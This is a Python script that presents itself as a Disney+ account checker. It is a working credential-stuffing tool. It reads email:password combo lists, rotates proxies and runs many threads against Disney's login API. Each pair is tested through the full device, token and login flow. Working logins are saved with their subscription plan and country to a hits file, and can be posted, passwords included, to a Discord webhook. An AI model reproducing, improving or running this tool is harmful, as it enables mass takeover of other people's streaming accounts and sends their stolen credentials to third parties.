import concurrent.futures
import threading
import time
import random
import os
import requests
import json
import configparser
from datetime import datetime
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Back, Style, init

# Initialize colorama
init(autoreset=True)

config = configparser.ConfigParser()
config_file = 'settings.cfg'

if not os.path.exists(config_file):
    config['DEFAULT'] = {
        'use_proxies': 'yes',
        'proxy_file': 'proxy_list.txt', 
        'combo_file': 'accounts.txt',
        'max_threads': '20',
        'discord_alerts': 'no',
        'webhook_url': ''
    }
    with open(config_file, 'w') as f:
        config.write(f)
config.read(config_file)

stats_lock = threading.Lock()
counters = {'checked': 0, 'good': 0, 'bad': 0, 'errors': 0}
failed_proxies = []

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"{Fore.CYAN}║{Fore.YELLOW}              DISNEY+ ACCOUNT CHECKER            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║{Fore.WHITE}               https://github.com/lovebyuzi                {Fore.CYAN}║")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝")
    print()

def print_status_line(message, status_type="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    if status_type == "hit":
        print(f"{Fore.WHITE}[{Fore.CYAN}{timestamp}{Fore.WHITE}] {Fore.GREEN}✅ HIT{Fore.WHITE} - {message}")
    elif status_type == "invalid":
        print(f"{Fore.WHITE}[{Fore.CYAN}{timestamp}{Fore.WHITE}] {Fore.RED}❌ INVALID{Fore.WHITE} - {message}")
    elif status_type == "error":
        print(f"{Fore.WHITE}[{Fore.CYAN}{timestamp}{Fore.WHITE}] {Fore.YELLOW}⚠️  ERROR{Fore.WHITE} - {message}")
    elif status_type == "retry":
        print(f"{Fore.WHITE}[{Fore.CYAN}{timestamp}{Fore.WHITE}] {Fore.MAGENTA}🔄 RETRY{Fore.WHITE} - {message}")
    else:
        print(f"{Fore.WHITE}[{Fore.CYAN}{timestamp}{Fore.WHITE}] {Fore.BLUE}ℹ️  INFO{Fore.WHITE} - {message}")

def send_to_discord(email, passw, subscription, location):
    webhook = config['DEFAULT'].get('webhook_url', '')
    if not webhook or config['DEFAULT'].get('discord_alerts', 'no') != 'yes':
        return
    
    embed_data = {
        "title": "✅ Valid Account Found",
        "color": 65280,
        "fields": [
            {"name": "Email", "value": email, "inline": True},
            {"name": "Password", "value": passw, "inline": True},
            {"name": "Subscription", "value": subscription, "inline": True},
            {"name": "Location", "value": location, "inline": True}
        ],
        "footer": {"text": "Checked on " + datetime.now().strftime("%Y-%m-%d")}
    }
    
    try:
        requests.post(webhook, json={"embeds": [embed_data]}, timeout=5)
    except:
        pass

def get_random_proxy():
    if config['DEFAULT'].get('use_proxies', 'yes') != 'yes':
        return None
    try:
        with open(config['DEFAULT'].get('proxy_file', 'proxy_list.txt'), "r") as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        return random.choice(proxy_list)
    except:
        return None

def format_proxy(proxy_str):
    if not proxy_str:
        return None
    if proxy_str.count(':') == 3:
        host, port, user, password = proxy_str.split(':', 3)
        return f"http://{user}:{password}@{host}:{port}"
    return None

def make_session(proxy_url=None):
    session = requests.Session()
    retry_policy = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry_policy, pool_connections=100, pool_maxsize=100)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    if proxy_url:
        session.proxies = {"http": proxy_url, "https": proxy_url}
    
    session.headers.update({
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84",
        "content-type": "application/json",
        "origin": "https://www.disneyplus.com",
        "referer": "https://www.disneyplus.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "x-bamsdk-client-id": "disney-svod-3d9324fc",
        "x-bamsdk-platform": "windows",
        "x-bamsdk-version": "4.16",
    })
    return session

def check_account(account_data):
    email, password = account_data
    proxy_str = get_random_proxy()
    proxy_url = format_proxy(proxy_str) if proxy_str else None
    session = make_session(proxy_url)

    try:
        device_data = {"deviceFamily": "browser", "applicationRuntime": "chrome", "deviceProfile": "windows", "attributes": {}}
        response = session.post('https://global.edge.bamgrid.com/devices', json=device_data, timeout=15)
        if response.status_code not in [200, 201]:
            raise Exception(f"Device error: {response.status_code}")
        auth_token = response.json()['assertion']

        token_payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={auth_token}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice"
        session.headers["content-type"] = "application/x-www-form-urlencoded"
        response = session.post('https://global.edge.bamgrid.com/token', data=token_payload, timeout=15)
        if 'unauthorized_client' in response.text:
            raise Exception("Token error")
        access_token = response.json()['access_token']

        check_data = {'email': email}
        session.headers["authorization"] = f"Bearer {access_token}"
        session.headers["content-type"] = "application/json; charset=UTF-8"
        response = session.post('https://global.edge.bamgrid.com/idp/check', json=check_data, timeout=15)
        if "\"operations\":[\"Register\"]" in response.text:
            with stats_lock:
                counters['bad'] += 1
            print_status_line(f"{email}:{password} - Account not registered", "invalid")
            return

        login_data = {'email': email, 'password': password}
        response = session.post('https://global.edge.bamgrid.com/idp/login', json=login_data, timeout=15)
        if 'Bad credentials' in response.text:
            with stats_lock:
                counters['bad'] += 1
            print_status_line(f"{email}:{password} - Bad credentials", "invalid")
            return
        if 'id_token' not in response.json():
            with stats_lock:
                counters['bad'] += 1
            print_status_line(f"{email}:{password} - No token received", "invalid")
            return
        id_token = response.json()['id_token']

        grant_data = {'id_token': id_token}
        response = session.post('https://global.edge.bamgrid.com/accounts/grant', json=grant_data, timeout=15)
        assertion = response.json()['assertion']

        final_payload = f"grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={assertion}&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount"
        session.headers["content-type"] = "application/x-www-form-urlencoded"
        session.headers["authorization"] = "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84"
        response = session.post("https://global.edge.bamgrid.com/token", data=final_payload, timeout=15)
        final_token = response.json()['access_token']

        session.headers["authorization"] = f"Bearer {final_token}"
        session.headers["content-type"] = "application/json"
        response = session.get('https://global.edge.bamgrid.com/subscriptions', timeout=15)

        if "\"isActive\":true" in response.text:
            plan_name = response.text.split('name":"')[1].split('"')[0]
            country_code = "Unknown"
            try:
                profile_response = session.get('https://global.edge.bamgrid.com/accounts/me', timeout=10)
                country_code = profile_response.json().get('account', {}).get('country', 'Unknown')
            except:
                pass
            
            with stats_lock:
                counters['good'] += 1
            with open("hits.txt", "a") as f:
                f.write(f"{email}:{password} | Plan: {plan_name} | Country: {country_code}\n")
            
            print_status_line(f"{email}:{password} | {plan_name} | {country_code}", "hit")
            send_to_discord(email, password, plan_name, country_code)
            
        else:
            with stats_lock:
                counters['bad'] += 1
            print_status_line(f"{email}:{password} - No active subscription", "invalid")

    except Exception as e:
        if proxy_str:
            failed_proxies.append(proxy_str)
        with stats_lock:
            counters['errors'] += 1
        print_status_line(f"{email}:{password} - {str(e)}", "error")
    finally:
        session.close()
        with stats_lock:
            counters['checked'] += 1

def main():
    print_banner()
    
    try:
        with open(config['DEFAULT'].get('combo_file', 'accounts.txt'), "r") as f:
            accounts = [line.strip().split(':', 1) for line in f if ':' in line]
    except:
        print_status_line("Could not load accounts file", "error")
        return

    print_status_line(f"Loaded {len(accounts)} accounts", "info")
    
    if config['DEFAULT'].get('use_proxies', 'yes') == 'yes':
        try:
            with open(config['DEFAULT'].get('proxy_file', 'proxy_list.txt'), "r") as f:
                proxies = [line.strip() for line in f if line.strip()]
            print_status_line(f"Loaded {len(proxies)} proxies", "info")
        except:
            print_status_line("No proxies file found", "info")
    
    print_status_line(f"Starting checking with {config['DEFAULT'].get('max_threads', '20')} threads", "info")
    print()
    
    max_threads = int(config['DEFAULT'].get('max_threads', '20'))
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        executor.map(check_account, accounts)
    
    print(f"\n{Fore.GREEN}✅ Checking completed! Check 'hits.txt' for results.")

if __name__ == "__main__":
    main()
